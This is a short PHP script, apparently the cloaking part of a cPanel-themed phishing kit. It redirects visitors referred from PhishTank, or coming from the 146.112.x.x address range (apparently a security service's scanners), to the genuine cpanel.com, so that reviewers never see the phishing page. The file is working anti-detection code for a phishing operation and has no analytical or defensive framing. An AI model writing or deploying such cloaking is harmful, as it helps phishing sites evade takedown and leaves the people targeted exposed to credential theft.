<?php
	if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
		    header("Location: https://www.cpanel.com");
		    die();
		}
		}

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
		    header("Location: https://www.cpanel.com");
		    die();
		}
		}

 ### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
	$range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

	 if ($ip2long >= $range_start && $ip2long <= $range_end){
	   header("Location: https://www.cpanel.com");
	   die();
	 }
?>